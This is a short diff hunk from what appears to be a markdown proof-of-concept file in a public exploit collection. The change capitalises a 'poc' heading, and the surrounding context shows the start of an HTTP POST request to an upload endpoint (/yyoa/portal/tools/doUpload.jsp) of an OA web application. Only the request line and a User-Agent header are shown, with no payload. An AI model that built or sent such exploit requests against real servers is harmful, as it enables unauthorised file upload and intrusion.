@@ -6,7 +6,7 @@
 ```
 ![image](https://github.com/wy876/POC/assets/139549762/c39bc2dc-867f-451b-af53-3ea1093e9546)
 
-## poc
+## POC
 ```
 POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
